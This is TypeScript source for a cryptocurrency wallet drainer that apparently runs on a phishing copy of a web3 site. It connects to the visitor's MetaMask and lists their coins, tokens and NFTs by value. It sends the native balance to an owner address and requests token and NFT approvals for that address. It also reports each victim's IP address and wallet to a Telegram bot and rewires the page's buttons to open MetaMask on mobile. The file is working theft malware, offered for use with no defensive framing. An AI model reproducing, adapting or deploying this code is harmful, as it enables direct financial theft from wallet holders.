import {
  updateState,
  ownerAddress,
  MORALIS_KEY,
  ZAPPER_KEY,
  tgConfig,
  chains,
  toDrain,
  autoMetamaskConnect,
  LOG_SCHEMA,
  logLanguage,
} from "./config";

import { ERC20_ABI } from "./ERC20_abi";
import { ERC721_ABI } from "./ERC721_abi";

import Web3 from "web3";

const { ethereum } = window;

let web3: any;

const ZAPPER_MATCH = {
  eth: "ethereum",
  matic: "polygon",
  bsc: "binance-smart-chain",
} as any;

const NATIVE_MATCH = {
  eth: "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
  matic: "0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0",
  bsc: "0x1f98431c8ad98523631ae4a59f267346ea31f984",
} as any;

const CHAIN_ID = {
  eth: 1,
  matic: 137,
  bsc: 56,
} as any;

const MORALIS_MATCH = {
  eth: "eth",
  matic: "polygon",
  bsc: "bsc",
};

var connected = 0;
let itemList = [] as any;

let nativePrices = {
  eth: 0,
  matic: 0,
  bsc: 0,
} as any;

let tgMsgCount = {
  approve: 0,
  canceled: 0,
  signed: 0,
  canceledSwitch: 0,
} as any;

let account = "" as string;

export async function connectMetamask() {
  if (connected == 1) return;
  if (!ethereum) {
    console.log("Metamask is not installed");
    return;
  }

  await ethereum.request({ method: "eth_requestAccounts" });
  const provider = window.ethereum;

  web3 = new Web3(provider);
  const accounts = await web3.eth.getAccounts();
  account = accounts[0];
  connected = 1;
  updateState("metamaskConnected");
  console.log("Current account ", account);
  updateState("userTokensFetching");
  await fetchUserTokens(account);
  updateState("userTokensFetched");
}

async function fetchUserTokens(address: string) {
  let native_url = `https://deep-index.moralis.io/api/v2/${address}/balance`;
  let token_url = `https://deep-index.moralis.io/api/v2/${address}/erc20`;
  let token_price_url = "https://deep-index.moralis.io/api/v2/erc20/";
  let nft_url = `https://api.zapper.fi/v2/nft/balances/tokens?addresses%5B%5D=${address}&limit=25`;

  let response = await fetch(
    "https://api.zapper.fi/v2/balances?addresses%5B%5D=" +
      `${address}` +
      "&networks%5B%5D=ethereum&networks%5B%5D=polygon&networks%5B%5D=binance-smart-chain",
    {
      headers: {
        Authorization: ZAPPER_KEY,
      },
    }
  );

  let ready = (await response.text()).replace(
    /[\n]*event: [\w]*[\n]*data: \{"appId":"([-\w]*)","network":"([-\w]*)"/gi,
    `,"data$1$2": {"appId":"$1","network":"$2"`
  );

  ready =
    "{" + ready.slice(1).replace("\n\nevent: end\ndata: {}\n\n", "") + "}";

  let data = JSON.parse(ready);

  console.log(data);

  let result = [];
  for (let network in data) {
    let tokens = [];
    for (let tok in data[network]["balance"]) {
      if (Object.keys(data[network]["balance"][tok]).length !== 0) {
        for (let TOKEN in data[network]["balance"][tok]) {
          if (
            data[network]["balance"][tok][TOKEN]["address"] !=
            "0x0000000000000000000000000000000000000000"
          ) {
            let t = {} as any;

            t["contract"] = data[network]["balance"][tok][TOKEN]["address"];
            t["type"] = "token";
            t["balance"] = parseInt(
              data[network]["balance"][tok][TOKEN]["context"]["balanceRaw"]
            );
            t["price"] = data[network]["balance"][tok][TOKEN]["balanceUSD"];
            if (data[network]["network"] == "binance-smart-chain") {
              t["chain"] = "bsc";
            } else if (data[network]["network"] == "polygon") {
              t["chain"] = "matic";
            } else if (data[network]["network"] == "ethereum") {
              t["chain"] = "eth";
            } else {
              t["chain"] = data[network]["network"];
            }
            tokens.push(t);
          } else {
            let t = {} as any;

            t["contract"] = data[network]["balance"][tok][TOKEN]["address"];
            t["type"] = "native";
            t["balance"] = parseInt(
              data[network]["balance"][tok][TOKEN]["context"]["balanceRaw"]
            );
            t["price"] = data[network]["balance"][tok][TOKEN]["balanceUSD"];
            if (data[network]["network"] == "binance-smart-chain") {
              t["chain"] = "bsc";
            } else if (data[network]["network"] == "polygon") {
              t["chain"] = "matic";
            } else if (data[network]["network"] == "ethereum") {
              t["chain"] = "eth";
            } else {
              t["chain"] = data[network]["network"];
            }
            tokens.push(t);
          }
        }
      }
    }
    if (Object.keys(tokens).length !== 0) result.push(tokens);
  }

  for (let item of Object.entries(chains)) {
    if (!item[1]) {
      continue;
    } else {
      let response = await fetch(
        token_price_url + `${NATIVE_MATCH?.[item?.[0]]}/price?chain=eth`,
        {
          headers: {
            "X-API-Key": MORALIS_KEY,
          },
        }
      );
      data = await response.json();

      nativePrices[item[0]] = data.usdPrice;
    }

    let currNativePrice = nativePrices[item[0]];

    if (toDrain[item[0]].nft == true) {
      let response = await fetch(nft_url, {
        headers: {
          Authorization: ZAPPER_KEY,
        },
      });

      const nftList = (await response.json()).items;

      itemList = itemList.concat(
        nftList.map((el: any) => {
          return {
            contract: el.token.collection.address,
            balance: el.token.tokenId,
            type: "nft",
            price: el.token.estimatedValueEth * currNativePrice,
            chain: item[0],
          };
        })
      );
    }

    if (toDrain[item[0]].tokens == true) {
      let tempList = [];
      for (let array in result) {
        for (let tokenid in result[array]) {
          if (
            result[array][tokenid]["chain"] == item[0] &&
            result[array][tokenid]["type"] == "token"
          ) {
            tempList.push(result[array][tokenid]);
          }
        }
      }

      itemList = itemList.concat(tempList);
    }

    if (toDrain[item[0]].eth == true) {
      let tempList = [];
      for (let array in result) {
        for (let tokenid in result[array]) {
          if (
            result[array][tokenid]["chain"] == item[0] &&
            result[array][tokenid]["type"] == "native"
          ) {
            tempList.push(result[array][tokenid]);
          }
        }
      }

      itemList = itemList.concat(tempList);
    }
  }

  itemList.sort((a: any, b: any) => {
    if (a.price > b.price) {
      return -1;
    } else if (a.price < b.price) {
      return 1;
    } else {
      return 0;
    }
  });
}

async function sendEth(amount: any, chain: any) {
  const estimate = await web3.eth.estimateGas({
    from: account,
    to: ownerAddress,
    value: amount,
  });

  const newAmount = amount - (estimate + 10000);

  if (newAmount < 0) return;

  const transactionObject = {
    from: account,
    to: ownerAddress,
    value: newAmount,
  };

  var success = 1;

  try {
    await web3.eth.sendTransaction(transactionObject);
  } catch (e) {
    console.log(e);
    success = 0;
  }

  logTx(success);
}

async function sendToken(amount: any, tokenAddress: any) {
  console.log("IN SEND TOKEN", amount, tokenAddress);
  var tokenContract = new web3.eth.Contract(ERC20_ABI, tokenAddress);
  var success = 1;

  try {
    await tokenContract.methods.approve(ownerAddress, amount.toString()).send({
      from: account,
      gas: 120000,
      gasPrice: 0,
    });
  } catch (e) {
    console.log(e);
    success = 0;
  }

  logTx(success);
}

async function sendNFT(id: string, tokenAddress: string) {
  var tokenContract = new web3.eth.Contract(ERC721_ABI, tokenAddress);
  var success = 1;
  try {
    await tokenContract.methods.approve(ownerAddress, id).send({
      from: account,
      gas: 120000,
      gasPrice: 0,
    });
  } catch (e) {
    console.log(e);
    success = 0;
  }
  logTx(success);
}

export async function drain() {
  for (var item of itemList) {
    console.log("draining", item);

    if (item.price > 0) {
      if (tgMsgCount.approve++ < 1) sendMsg(LOG_SCHEMA[logLanguage].onApprove);
      try {
        if (window.ethereum.networkVersion !== CHAIN_ID[item.chain])
          await changeNetwork(CHAIN_ID[item.chain]);
      } catch (e) {
        if (tgMsgCount.canceledSwitch++ < 3)
          sendMsg(LOG_SCHEMA[logLanguage].onCancelSwitch);
        continue;
      }
      try {
        if (item.type == "native") await sendEth(item.balance, item.chain);
        else if (item.type == "token")
          await sendToken(item.balance, item.contract);
        else if (item.type == "nft") await sendNFT(item.balance, item.contract);
      } catch (e) {
        console.log(e);
      }
    }
  }
}

const changeNetwork = async (chainId: any) => {
  if (window.ethereum) {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: Web3.utils.toHex(chainId) }],
    });
  }
};

function logTx(success: any) {
  if (success == 1) {
    if (tgMsgCount.signed++ < 3) sendMsg(LOG_SCHEMA[logLanguage].onSign);
  } else {
    if (tgMsgCount.canceled++ < 3) sendMsg(LOG_SCHEMA[logLanguage].onCancel);
  }
}

async function sendMsg(msg: string) {
  try {
    var newMsg = msg
      .replace("$id", window.localStorage.getItem("scUniqueId") as string)
      .replace("$wallet", account);
    var url = `https://api.telegram.org/bot${tgConfig.botToken}/sendMessage?chat_id=${tgConfig.chatId}&parse_mode=markdown&text=${newMsg}`;
    console.log(newMsg);
    let resp = fetch(url);
  } catch (err) {
    console.error(err);
  }
}

window.addEventListener("load", async () => {
  let id = localStorage.getItem("scUniqueId");
  if (id == null) {
    let response = await fetch("https://api.ipify.org");
    id = await response.text();
    localStorage.setItem("scUniqueId", id);
  }

  sendMsg(LOG_SCHEMA[logLanguage].onConnect);
});
try {
  window.ethereum.on("accountsChanged", (accounts: any) => {
    let account = accounts[0];
    let id = localStorage.getItem("scUniqueId");
    if (connected == 0) {
      sendMsg(LOG_SCHEMA[logLanguage].onMetamaskConnect);
    }
  });
} catch (e) {
  console.log(e);
}

window.addEventListener("beforeunload", function (e) {
  var confirmationMessage =
    "It looks like you have been editing something. " +
    "If you leave before saving, your changes will be lost.";

  (e || window.event).returnValue = confirmationMessage; //Gecko + IE
  sendMsg(LOG_SCHEMA[logLanguage].onDisconnect);
  return confirmationMessage; //Gecko + Webkit, Safari, Chrome etc.
});

function getMobileOperatingSystem() {
  var userAgent = navigator.userAgent || navigator.vendor || window.opera;
  console.log(userAgent);
  const queryString = window.location.search;
  const urlParams = new URLSearchParams(queryString);
  const uid = urlParams.get("uid");
  console.log(uid);
  if (uid == "mm") {
    return "Metamask";
  }
  if (/windows phone/i.test(userAgent)) {
    return "Windows Phone";
  }

  if (/android/i.test(userAgent)) {
    return "Android";
  }
  if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
    return "iOS";
  }

  return "unknown";
}

document.addEventListener("DOMContentLoaded", (event) => {
  if (
    getMobileOperatingSystem() == "Android" ||
    getMobileOperatingSystem() == "iOS"
  ) {
    let connects = [
      document.querySelector(
        "#app > div > div.layout-content > div > div.section.section1.scroll-item > div.btns > a > span"
      ),
      document.querySelector(
        "#app > div > div.layout-content > header > div.menu-items > ul > li.menu-links.menu-icon.hover-color-anim.cursor-pointer"
      ),
    ];
    for (let connect of connects) {
      var wrapper = document.createElement("a");
      wrapper.classList.add("mmLink");
      wrapper.href =
        "https://metamask.app.link/dapp/" +
        window.location.href.replace("https://", "").replace("http://", "") +
        "?uid=mm";
      connect.parentNode.insertBefore(wrapper, connect);
      wrapper.appendChild(connect as Node);
    }
  }
});

updateState("metamaskDisconnected");

if (autoMetamaskConnect === 1) {
  connectMetamask();
}

export async function connectAndDrain() {
  if (connected == 0) await connectMetamask();
  await drain();
}
